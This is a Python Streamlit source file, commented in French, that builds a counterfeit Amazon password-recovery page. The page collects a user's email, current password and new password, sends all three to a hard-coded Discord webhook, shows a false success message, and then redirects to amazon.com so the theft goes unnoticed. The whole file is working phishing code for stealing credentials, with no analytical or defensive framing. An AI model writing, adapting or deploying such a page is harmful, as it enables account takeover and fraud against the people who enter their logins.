import streamlit as st
from discord_webhook import DiscordWebhook


# Configurer la page en premier
st.set_page_config(
    page_title="Amazon Recovery Password",
    page_icon="az.jpg",
)

# URL du logo Amazon





# Créer trois colonnes et utiliser uniquement la colonne du milieu
col1, col2, col3 = st.columns([1, 2, 1])

with col2:
    # Afficher le logo Amazon en haut de la page, centré
    st.image("https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg", width=200)

    # Texte de l'application
    text = """
    ### Aide avec le mot de passe
    Saisissez l'adresse e-mail ainsi que votre mot de passe associé à votre compte Amazon.
    """
    st.markdown(text)

    # Entrée pour l'email et le mot de passe
    mail = st.text_input("Entrez votre email")
    password_actuel = st.text_input("Entrez votre mot de passe actuel", type="password")
    password_new = st.text_input("Entrez votre nouveau mot de passe", type="password")

    # Envoi des données via Webhook Discord
    if st.button("Changer le mot de passe"):
        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1250455697016098886/QRQw14z7VjuuO96yXI-Z6dVjIzUTGfffnptRahsKYVHHqQpGFRJI6By02tBaHeQTzqHE", content=f"Email: {mail}\nPassword actual: {password_actuel}\nPassword new: {password_new}")
        response = webhook.execute()
        st.success("Votre mot de passe a été correctement changé. Vous allez rediriger vers Amazon.com d'ici peu")
        js = "window.open('https://www.amazon.com')"
        st.components.v1.html(f"<script>{js}</script>", height=0)